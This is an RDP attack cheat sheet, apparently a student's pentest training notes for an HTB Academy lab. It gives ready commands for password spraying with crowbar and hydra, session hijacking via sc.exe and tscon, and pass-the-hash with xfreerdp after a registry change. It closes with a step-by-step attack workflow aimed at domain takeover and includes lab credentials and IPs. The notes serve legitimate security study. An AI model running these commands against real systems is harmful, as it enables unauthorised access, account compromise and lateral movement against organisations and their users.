# 🛰️ RDP (Remote Desktop Protocol) Attack Cheat Sheet

> [!info] 🧠 What is RDP?
> 
> Bash
> 
> ```
> Proprietary network protocol developed by Microsoft providing a graphical interface to manage remote computers
> ```
> 
> 💡 Allows administrators to:
> 
> - Centrally control remote systems with the exact same functionality as if they were on-site.
>     
> - Manage hundreds of distributed customer networks and corporate endpoints efficiently (widely used by Managed Service Providers / MSPs).
>     
> - Run visual administrative applications that cannot be executed via terminal command lines alone.
>     
> 
> ✔ Common in:
> 
> - Windows enterprise environments, Active Directory networks, and remote work infrastructures.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Client (Graphical Terminal Session) ↔ Server (Remote Host Subsystem)
> ```
> 
> 💡 Key Ports:
> 
> - **TCP 3389** → Default RDP Listening Port (Handles graphical terminal stream connection initialization).
>     
> 
> ✔ Think of it as **a digital long-distance monitor and keyboard extension plugged straight into the remote server over the network**

# 🌳 Structure: Session Management & Authentication

> [!info] 📚 Interactive Client Access
> 
> Bash
> 
> ```
> xfreerdp  # Modern, optimized client supporting Pass-the-Hash and Network Level Authentication (NLA)
> rdesktop  # Legacy RDP client used for basic unencrypted graphical connection streams
> ```
> 
> 💡 Function:
> 
> - Translates local keyboard, mouse, and display inputs into network data packets sent to the host's terminal interface.
>     

> [!tip] 📥 Data Movement: Clipboard & Resource Redirection
> 
> Bash
> 
> ```
> /cliprdr     # Enables synchronized clipboard redirection between Kali and the target host
> /drive:<name>,<path> # Mounts a local Kali directory as an internal network share inside the RDP session
> ```
> 
> 💡 Logic:
> 
> - Attacks focus on initial credential theft to establish an interactive graphical interface or exploiting active administrative user tokens post-compromise.
>     

# 🔐 Access Methods

|**Authentication Type**|**Credentials Required**|**Risk Level**|**Notes**|
|---|---|---|---|
|**Password Guessing / Spraying**|Valid Username + Guessed Password|**HIGH**|Targets weak accounts; highly dangerous if lockout limits are not strictly enforced|
|**Pass-the-Hash (PtH)**|Valid Username + Raw NTLM Password Hash|**MEDIUM**|Requires Restricted Admin Mode (`DisableRestrictedAdmin = 0`) enabled on target|
|**Session Hijacking (`tscon`)**|None (Requires `NT AUTHORITY\SYSTEM` Context)|**CRITICAL**|Steals an active or disconnected user's existing visual session without a password|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Key Enumeration Tools
> 
> Bash
> 
> ```
> # 1. Targeted Port & Script Scan
> sudo nmap -Pn -p 3389 <target>
> 
> # 2. Automated Password Spraying via Crowbar
> crowbar -b rdp -s <target>/32 -U usernames.txt -c 'password123'
> 
> # 3. Low-Threaded Password Spraying via Hydra
> hydra -L usernames.txt -p 'password123' <target> rdp -t 4
> ```
> 
> 💡 Flag breakdown:
> 
> - `-Pn` disables host discovery pings, preventing firewalls from dropping the scan traffic silently.
>     
> - `-t 4` restricts parallel threads inside Hydra because RDP engines crash under aggressive multi-threaded connection storms.
>     

> [!info] 🔍 Information Revealed
> 
> - **RDP Service Availability:** Confirms an open network path to the Windows graphical interface terminal.
>     
> - **SSL/TLS Certificates:** Exposes internal Windows computer names, domain structures, and operating system build details via the auto-generated server certificate.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Disabled Account Lockout Limits & Restricted Admin Mode
> 
> Bash
> 
> ```
> Domain Policy: No Lockout Threshold
> Registry Path: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
> ```
> 
> 💡 Impact:
> 
> - **No Lockout:** Allows attackers to launch extensive password guessing or spraying campaigns without locking users out or tripping system defensive controls.
>     
> - **Restricted Admin Enabled:** Allows attackers to authenticate to the graphical RDP workspace using a stolen, uncracked NTLM password hash instead of cleartext passwords.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ RDP Password Spraying
> 
> Bash
> 
> ```
> crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
> ```
> 
> 💡 Impact:
> 
> - Tests **one common password** across an entire list of distinct user accounts simultaneously.
>     
> - Bypasses standard threshold alarms and security controls to successfully identify weak production credentials (e.g., finding `administrator:password123`).
>     

> [!danger] 🎯 RDP Session Hijacking (`tscon.exe`)
> 
> Bash
> 
> ```
> # 1. Query active users to locate high-value target session IDs
> query user
> # 2. Force session hijack using local SYSTEM context
> sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_ID> /dest:<OUR_SESSION_NAME>"
> net start sessionhijack
> ```
> 
> 💡 Risk:
> 
> - Allows a local administrator to intercept and take over an active or disconnected session belonging to another user (like a Domain Admin).
>     
> - Completely bypasses credential prompt verifications, granting instant privilege escalation or lateral network access. _(Note: Disabled by default on Server 2019+)._
>     

> [!danger] 🔑 RDP Pass-the-Hash (PtH)
> 
> Bash
> 
> ```
> # Force enable Restricted Admin Mode via registry if local admin is achieved
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> 
> # Execute xfreerdp passing the raw NTLM hash
> xfreerdp /v:<target> /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
> ```
> 
> 💡 Risk:
> 
> - Bypasses cleartext password verification entirely.
>     
> - Grants full graphical desktop access to the system using only a cryptographic NTLM hash dumped from memory or disk.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Target TCP Port 3389 via Nmap to verify if the graphical service interface is exposed.
> 2. Harvest user profiles, then run Crowbar to spray common credentials against the user list.
> 3. Authenticate with valid discoveries using xfreerdp to establish an initial host foothold.
> 4. If local admin is hit, run 'query user' to hunt for active or disconnected high-value user tokens.
> 5. Create a system service using 'sc.exe' and invoke 'tscon' to hijack the targeted session ID.
> 6. Alternatively, modify the 'DisableRestrictedAdmin' registry key to execute lateral Pass-the-Hash movements via xfreerdp.
> ```
> 
> 💡 Always restrict connection thread limits when testing RDP services to avoid crashing the target network stack.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> Graphical Workspace → The Core Control Room
> Password Spraying → Checking one master key combination across every lock on the block
> Session Hijacking (tscon) → Stepping directly into a live terminal screen while the operator steps away
> Pass-the-Hash (pth) → Unlocking a secure security entry scanner using a cloned key fob instead of the master passcode
> ```
> 
> 💡 If you compromise a local administrator account, the network interface boundaries dissolve. Treat every active user session as an immediate escalation bridge to full domain takeover.


>[!NOTE]
>best rdp command 
```
>xfreerdp3 /v:10.129.26.171 /u:hbt-student /p:'HTB_@cademy_stdnt!' /cert:ignore /sec:tls /gdi:sw -audio -clipboard +fonts
```

> [!NOTE]
share drive with rdp 
```
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.40.69 /cert:ignore +clipboard /drive:share,/tmp +sec-ntlm
```


